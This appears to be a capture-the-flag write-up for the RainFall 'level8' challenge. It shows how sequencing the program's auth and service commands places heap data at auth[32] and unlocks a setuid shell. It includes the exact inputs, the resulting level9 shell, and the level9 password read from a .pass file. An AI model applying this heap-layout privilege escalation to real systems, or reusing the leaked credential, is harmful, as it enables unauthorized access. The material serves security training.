# Level8

We can find an executable waiting for an input :
```
level8@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
level8@RainFall:~$ ./level8
(nil), (nil)
bla
(nil), (nil)
test
(nil), (nil)

(nil), (nil)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
(nil), (nil)
^C
level8@RainFall:~$
```
After analyze it with gdb we only find a `main()` function, long enough..  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level8/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level8/source.c) for full explanations.  
Ok, so the program run `system("/bin/sh")` after a serie of conditionnal jumps.  
It also reads stdin with `fgets()` and waits for commands :  
- `auth ` : calls malloc() and strcpy() and copies datas following `auth ` into the global variable auth.  
- `service` : calls strdup() and copies datas following `service` into the global variable service.  
- `reset` : calls free() and frees the global variable auth.  
- `login` : calls system() if auth[32] is different to 0, or fwrite() otherwise. 
Then displays addresses of the globals variables auth and service.  
In order to reach the system function we have to play with the commands above. Lets run the program to see the addresses of our globals variables after each commands :  
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018
```
At this moment we can see that the address of service is exactly 16 bytes after the address of auth. This is because of malloc(), each pointer is placed right after the previous one with some padding between.  
We can already imagine two possible solutions :  
## First solution
Create two pointer with commands `auth ` and `service` long enough to reach 32 bytes including the 16 bytes of padding between them :  
- 16 padding bytes + 16 service bytes  
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$
```
## Second solution
Create one pointer with command `auth ` then another by taping 2 times `service` with 2 * 16 bytes padding => 32 bytes !  
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018        // 0x804a008 + 0x10 = 0x804a018
service
0x804a008, 0x804a028        // 0x804a008 + 0x20 = 0x804a028
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$
```
Then we just have to log as level9
```
level8@RainFall:~$ su level9
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$
```
Level8 passed!
